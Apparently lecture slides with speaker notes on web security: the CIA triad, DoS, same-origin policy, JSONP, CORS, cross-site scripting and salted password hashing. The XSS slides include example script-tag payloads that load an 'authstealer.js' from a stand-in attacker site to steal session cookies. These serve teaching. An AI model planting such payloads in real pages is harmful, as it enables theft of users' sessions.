## The CIA

* Confidentiality
    * Keeping information secret from those who should not be able to see it
* Integrity
    * Data integrity: has the content of the data been modified?
    * Origin integrity: can you verify the source of the data?
* Availability
    * Can you access the information?

Note:
* Denial of service attacks attack availability

-###-

## Policy and Mechanism

* **Policy** defines what actions are allowed in the system
* **Mechanism** is a way to enforce policy

-###-

## Threats

* A **threat** is a potential security violation
* **Threat Modelling** is the process of identifying threats in your system that you will aim to protect against
* Generally, you can call the entity that you will protect against an *adversary*

-###-

## Our System Model

* Alice
* Bob
* Mallory

-###-

## Tools for Identity

* Symmetric ciphers
    * A secret key is used to encrypt messages
    * Anyone who knows the secret can read the message
    * E.g., AES
* Public-key cryptography
    * Anyone can encrypt a message such that only Bob can read it
    * E.g., RSA

-###-

## Tools for Identity

* Digital signatures
    * Anyone can verify that Bob sent a message
    * E.g., RSA
* Cryptographic hash functions
    * Should be collision-resistant (among other properties...)
    * E.g., SHA-256

Note:
* The Green Lock

-###-

## Availability Attack

* Example DoS attack:  Slow Loris
    * Send partial request to server
    * Just before timeout, send more of a partial request
    * Never complete a request
    * Exhaust server resources to handle new requests

-###-

## Availability Attack

* Modern DoS:
    * DDoS:  Distributed Denial of Service
    * Have thousands of machines send requests to the server to exhaust its resources to handle new requests
    * Botnets have historically been used to execute such attacks

-###-

## Web-specific security: the Same-origin policy

> Two web pages, both alike in dignity, In fair intertubes, where we lay our scene, From ancient grudge break to new mutiny, Where civil data makes civil requests unclean.

Note:
* "a web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. This policy prevents a malicious script on one page from obtaining access to sensitive data on another web page through that page's Document Object Model."
* Bank page, arbitrary other page
* "All modern browsers implement some form of the Same-Origin Policy as it is an important security cornerstone. The policies are not required to match an exact specification but are often extended to define roughly compatible security boundaries for other web technologies, Silverlight, Adobe Flash, or Adobe Acrobat, or for mechanisms other than direct DOM manipulation, such as `XMLHttpRequest`."

-###-

## Other origins: JSONP

* JSON with padding
* To get JSON representation of resource `ex_b.com/r1` from `ex_a.com`
    * Can't use AJAX
    * Violates same-origin policy on scripts

-###-

## Other origins: JSONP

* Use the `<script>` tag and some clever h4x:
    * `<script "application/javascript" src="ex_b.com/r1"></script>`
    * Except, ex_b.com/r1 will return JSON, not JS…
    * E.g., `{"type": "resource", "name": "r1"}`

-###-

## Other origins: JSONP

* So set source as follows:
    * "ex_b.com/r1?callback=parseResponse"
* Reponse now:
    * `parseResponse({"type": "resource", "name": "r1"})`
    * Now this is *JS*!
* Issues with this approach?

Note:
* <https://www.w3schools.com/js/tryit.asp?filename=tryjson_jsonp_callback>
* Check out source on html frame
* use JS DOM manipulation to add script tag to page
* padding is the callback function
* must accept arbitrary code from server!
* very hacky overall...

-###-

## Other origins: CORS

* Cross-Origin Resource Sharing

![CORS](images/security/cors.png)

Note:
* XHR = XMLHttpRequest
* POST usage limited to certain MIME types

-###-

## Cross-site scripting attacks

* Persistent attack example:
    * Consider the comments section of an article on news.example.com
    * Mallory notices that she can add HTML to her comments to change how they are displayed
    * E.g., adding `<em></em>` will render parts of her comments at emphasized for readers of the article
    * What happens when Mallory posts the following comment:

```
I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
```

Note:
* everyone who loads the page will load that script
* the script will be loaded under the origin news.example.com
* will have access to news.example.com cookies, can steal anyones session!
* Solutions?

-###-

## Cross-site scripting attacks: reflected attack

* Mallory notices that when she searches example.com for "puppies", the following happens:
* She taken to the page example.com/?q=puppies
* She is show a page that simply says "puppies not found!"
* What could happen if Mallory searches for:

```
<script src="http://mallorysevilsite.com/authstealer.js"></script>
```

-###-

## Site design: Error handling

* Consider login controller from minitwit
* Try to view a private GitHub repo in incognito mode

Note:
* with private repos: confidentiality of content and existence
* What if login told you how many characters were wrong?

-###-

## Data storage: Passwords

* Assertion: You (as a server operator) should know a user's password
* Assertion: Your application should know a user's password

-###-

## Data storage: Passwords

* How can they log in?
* Store hashes of the password!
* If you ever click "forgot password" on a site, and they email you back your password, don't trust that site!

Note:
* Need to protect the user passwords in case your database is compromised
* note hash functions in general will be fast to compute
* use bcrypt()!

-###-

## Hashed password login

* Where should the password be hashed?
    * I.e., where should SHA256(user_pass) be run?
    * On the server side? (Python)
    * On the client side? (JS)?

Note:
* server side!  otherwise the hash is essentially the password and the db can still be compromised
* so server gets to know a user password, just not allowed to store/remember it

-###-

## Spice up your passwords!

* A bit of salt
* For every user, generate a random number
    * Using a cryptographically secure random number generator!
    * This is the salt
* Generate hashes for that user as the supplied password concatenated with the salt
    * Why?

Note:
* note hash functions in general will be fast to computer, may want a slow alg here…

-###-

## A note about all of this

# NEVER IMPLEMENT YOUR OWN CRYPTO

-###-

# NEVER IMPLEMENT YOUR OWN CRYPTO

> Use a trusted and tested library.
> For password storage, use bcrypt or something comprable
